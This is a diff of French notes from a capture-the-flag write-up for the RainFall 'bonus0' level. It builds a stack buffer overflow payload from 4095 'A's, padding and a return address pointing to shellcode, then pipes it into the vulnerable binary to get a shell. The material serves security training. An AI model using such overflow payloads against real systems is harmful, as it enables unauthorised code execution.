@@ -58,7 +58,7 @@ int main(int argc, char *argv[])
     printf("%p\n", ptr);
 }
 
->> 0xbffff803 
+>> 0xbffff831 
 l'adresse du shellcode
 
 On va construire un payload:
@@ -66,20 +66,14 @@ On va construire un payload:
  4095 * A + \n  + padding + adresse du shell code 
    premiere entree  
 
-On segfault a 17. On a vu qu'un charactere decale de 2 au lieu de 1. On veut mettre une adresse donc 4*2=8
-17-8=9
-python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x03\xf8\xff\xbf'  > /tmp/test
+pour trouver le padding on utiliser 
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
 
-On se segfault plus, la string n'est plus assez longue ! Il suffit de rajouter nimporte quoi derriere 
+offset = 9
 
+python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x31\xf8\xff\xbf'  > /tmp/test
 
-python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x03\xf8\xff\xbf' + 'A'*6" > /tmp/test
-
-
-my sh 0xbffff803
-
-python -c "print 'A'*4095 + '\n' + 'A'*16 + '\x03\xf8\xff\xbf'" > /tmp/test
+On se segfault plus, la string n'est plus assez longue ! Il suffit de rajouter au moins 7 characteres derriere pour remplir le buffer de 20 ( 20 - 9 - 4(adresse) = 7)
 
 
-
-printf(strcmp(i, '0'));
+bonus0@RainFall:~$(python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x31\xf8\xff\xbf' + 'A'*7" ; cat -) | ./bonus0
